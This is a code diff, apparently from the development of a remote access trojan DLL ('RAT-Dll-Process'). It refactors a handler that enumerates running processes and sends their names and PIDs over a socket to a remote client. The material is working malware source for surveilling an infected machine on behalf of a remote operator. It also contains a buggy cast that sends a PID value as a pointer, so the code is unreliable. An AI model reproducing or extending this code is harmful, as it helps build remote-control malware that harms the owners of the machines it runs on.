@@ -41,40 +41,12 @@ INT handleProcessList(SOCKET clientSock)
 		 goto cleanup;
 	 }
 
-
-
 	 status = sendProcesses(clientSock, processNames, processPIDs, numProcesses);
-
-
-
-
-	 // Iterate through each list, send the process name and the PID
-	 for (int i = 0; i < numProcesses; i++)
+	 if (status != SUCCESS)
 	 {
-		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Sending process %s\n", processNames[i]);
+		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from sendProcesses %d\n", status);
 		 OutputDebugStringA(msgBuf);
-
-		 status = send(clientSock, (processNames)[i], strlen(processNames[i]), 0);
-		 if (status == SOCKET_ERROR)
-		 {
-			 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from send (process name %s) %d\n", processNames[i], WSAGetLastError());
-			 OutputDebugStringA(msgBuf);
-			 status = WSAGetLastError();
-			 goto cleanup;
-		 }
-
-		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Sending PID %d\n", processPIDs[i]);
-		 OutputDebugStringA(msgBuf);
-
-		 //status = send(clientSock, (const char*)processPIDs[i], sizeof(DWORD), 0);
-		 status = send(clientSock, (const char*)processPIDs[i], sizeof(processPIDs[i]), 0);
-		 if (status == SOCKET_ERROR)
-		 {
-			 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from send (process pid number %d) %d\n", processPIDs[i], WSAGetLastError());
-			 OutputDebugStringA(msgBuf);
-			 status = WSAGetLastError();
-			 goto cleanup;
-		 }
+		 goto cleanup;
 	 }
 
 	 OutputDebugStringA("RAT-Dll-Process::handleProcessList - Successfully sent all processes !\n");
@@ -190,7 +162,6 @@ INT doProcessList(__out char*** processNames, __out DWORD** processPIDs, __out I
 	*processPIDs = processPIDsOut;
 
 
-
 cleanup: 
 	return status;
 }
@@ -217,7 +188,6 @@ INT sendProcesses(SOCKET clientSock, char** processNames, DWORD* processPIDs, IN
 		sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Sending PID %d\n", processPIDs[i]);
 		OutputDebugStringA(msgBuf);
 
-		//status = send(clientSock, (const char*)processPIDs[i], sizeof(DWORD), 0);
 		status = send(clientSock, (const char*)processPIDs[i], sizeof(processPIDs[i]), 0);
 		if (status == SOCKET_ERROR)
 		{
@@ -227,7 +197,6 @@ INT sendProcesses(SOCKET clientSock, char** processNames, DWORD* processPIDs, IN
 			goto cleanup;
 		}
 	}
-
 
 
 cleanup:
